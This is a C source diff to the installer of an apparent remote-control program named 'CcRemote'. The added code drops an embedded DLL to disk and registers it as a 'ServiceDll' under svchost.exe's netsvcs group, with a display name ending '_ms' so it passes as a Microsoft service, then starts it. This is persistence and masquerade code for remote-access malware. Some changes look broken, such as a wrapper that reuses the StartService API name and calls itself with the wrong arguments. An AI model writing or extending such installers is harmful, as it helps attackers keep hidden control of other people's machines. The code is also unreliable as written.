@@ -131,8 +131,26 @@ char *AddsvchostService()
 	return lpServiceName;
 }
 
+void StartService(LPCTSTR lpService)
+{
+	SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+	if (NULL != hSCManager)
+	{
+		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
+		if (NULL != hService)
+		{
+			StartService(hService, 0, NULL);
+			CloseServiceHandle(hService);
+			printf("lpService");
+		}
+		CloseServiceHandle(hSCManager);
+	}
+}
+
+
 int main()
 {
+
 	//CreateEXE("E:\\aaa.dll", IDR_DLL1, "DLL");
 	char lpServiceDescription[]= "CcRemote服务";
 	char strModulePath[MAX_PATH];
@@ -144,13 +162,12 @@ int main()
 	HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
 	SC_HANDLE hscm = NULL, schService = NULL;
 
-
 	//打开服务
 	hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
 	GetSystemDirectory(strSysDir, sizeof(strSysDir));
 	char bin[] = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
 	char *lpServiceName = AddsvchostService();                             //*添加的代码在这个函数中*
-	char lpServiceDisplayName[128];
+	char lpServiceDisplayName[128] = {0};
 	wsprintf(lpServiceDisplayName, "%s_ms,", lpServiceName);
 	//这里返回新的服务名后就构造服务dll的名字
 	memset(strModulePath, 0, sizeof(strModulePath));
@@ -176,7 +193,11 @@ int main()
 	dwStartType = SERVICE_WIN32_OWN_PROCESS;
 
 	if (schService == NULL)
+	{
 		throw "CreateService(Parameters)";
+		printf("schServicenull");
+	}
+		
 
 	CloseServiceHandle(schService);
 	CloseServiceHandle(hscm);
@@ -184,7 +205,6 @@ int main()
 	hkRoot = HKEY_LOCAL_MACHINE;
 	//这里构造服务的描述键
 	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
-
 	if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
 	{
 		DWORD	dwServiceType = 0x120;
@@ -197,15 +217,19 @@ int main()
 
 	lstrcat(strSubKey, "\\Parameters");
 	//写入服务的描述
-	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "CcMainDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);
+	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);
 
-
-
+	printf("123");
+	if (schService != NULL)
+	{
+		CreateEXE(strModulePath, IDR_DLL1, "DLL");
+		StartService(lpServiceName);
+	}
 	RegCloseKey(hkRoot);
 	RegCloseKey(hkParam);
 	CloseServiceHandle(schService);
 	CloseServiceHandle(hscm);
-
+	system("pause");
 	return 0;
 
 }
